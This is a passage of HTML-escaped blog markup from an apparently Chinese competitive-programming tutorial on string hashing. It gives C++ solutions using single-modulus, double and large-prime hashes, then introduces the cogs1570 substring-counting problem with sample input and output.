class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=hashs(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i]!=a[i-1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这是单模数 hash (80)&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod=19260817;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hashs(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=hashs(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i]!=a[i-1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这是双 hash (100)&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;struct data&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull x,y;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod1=19260817;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod2=19660813;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hash1(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hash2(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bool comp(data a,data b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return a.x&amp;lt;b.x;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i].x=hash1(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i].y=hash2(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1,comp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i].x!=a[i-1].x || a[i-1].y!=a[i].y)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这是只用一个 10^18 质数的 hash (100)&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstdio&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;cstring&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;algorithm&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;typedef unsigned long long ull;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull base=131;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull a[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;char s[10010];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int n,ans=1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull mod=212370440130137957ll;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ull hashs(char s[])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    int len=strlen(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ull ans=0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=0;i&amp;lt;len;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans=(ans*base+(ull)s[i])%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return ans;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    scanf(&amp;quot;%d&amp;quot;,&amp;amp;n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=1;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        scanf(&amp;quot;%s&amp;quot;,s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[i]=hashs(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sort(a+1,a+n+1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for (int i=2;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if (a[i]!=a[i-1])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ans++;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%d\n&amp;quot;,ans);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;hash还有一方面就是它可以处理子串信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hash还有一方面就是它可以处理子串信息&#34;&gt;#&lt;/a&gt; Hash 还有一方面，就是它可以处理子串信息&lt;/h2&gt;
&lt;p&gt;cogs1570&lt;/p&gt;
&lt;p&gt;【题目描述】&lt;/p&gt;
&lt;p&gt;法国作家乔治・佩雷克 (Georges Perec，1936-1982) 曾经写过一本书，《敏感字母》（La disparition），全篇没有一个字母‘e’。他是乌力波小组（Oulipo Group）的一员。下面是他书中的一段话：&lt;/p&gt;
&lt;p&gt;Tout avait Pair normal, mais tout s’affirmait faux. Tout avait Fair normal, d’abord, puis surgissait l’inhumain, l’affolant. Il aurait voulu savoir où s’articulait l’association qui l’unissait au roman : stir son tapis, assaillant à tout instant son imagination, l’intuition d’un tabou, la vision d’un mal obscur, d’un quoi vacant, d’un non-dit : la vision, l’avision d’un oubli commandant tout, où s’abolissait la raison : tout avait l’air normal mais…&lt;/p&gt;
&lt;p&gt;佩雷克很可能在下面的比赛中得到高分（当然，也有可能是低分）。在这个比赛中，人们被要求针对一个主题写出甚至是意味深长的文章，并且让一个给定的 “单词” 出现次数尽量少。我们的任务是给评委会编写一个程序来数单词出现了几次，用以得出参赛者最终的排名。参赛者经常会写一长串废话，例如 500000 个连续的‘T’。并且他们不用空格。&lt;/p&gt;
&lt;p&gt;因此我们想要尽快找到一个单词出现的频数，即一个给定的字符串在文章中出现了几次。更加正式地，给出字母表 {&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,...,&#39;Z&#39;} 和两个仅有字母表中字母组成的有限字符串：单词 W 和文章 T，找到 W 在 T 中出现的次数。这里 “出现” 意味着 W 中所有的连续字符都必须对应 T 中的连续字符。T 中出现的两个 W 可能会部分重叠。&lt;/p&gt;
&lt;p&gt;【输入格式】&lt;/p&gt;
&lt;p&gt;输入包含多组数据。&lt;/p&gt;
&lt;p&gt;输入文件的第一行有一个整数，代表数据组数。接下来是这些数据，以如下格式给出：&lt;/p&gt;
&lt;p&gt;第一行是单词 W，一个由 {&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,...,&#39;Z&#39;} 中字母组成的字符串，保证 1&amp;lt;=|W|&amp;lt;=10000（|W | 代表字符串 W 的长度）&lt;/p&gt;
&lt;p&gt;第二行是文章 T，一个由 {&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,...,&#39;Z&#39;} 中字母组成的字符串，保证 | W|&amp;lt;=|T|&amp;lt;=1000000。&lt;/p&gt;
&lt;p&gt;【输出格式】&lt;/p&gt;
&lt;p&gt;对每组数据输出一行一个整数，即 W 在 T 中出现的次数。&lt;/p&gt;
&lt;p&gt;【样例输入】&lt;/p&gt;
&lt;p&gt;3&lt;br /&gt;
BAPC&lt;br /&gt;
BAPC&lt;br /&gt;
AZA&lt;br /&gt;
AZAZAZA&lt;br /&gt;
VERDI&lt;br /&gt;
AVERDXIVYERDIAN&lt;/p&gt;
&lt;p&gt;【样例输出】&lt;/p&gt;
&lt;p&gt;1&lt;br /&gt;
3&lt;br /&gt;
0&lt;/p&gt;
&lt;p&gt;代码&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include 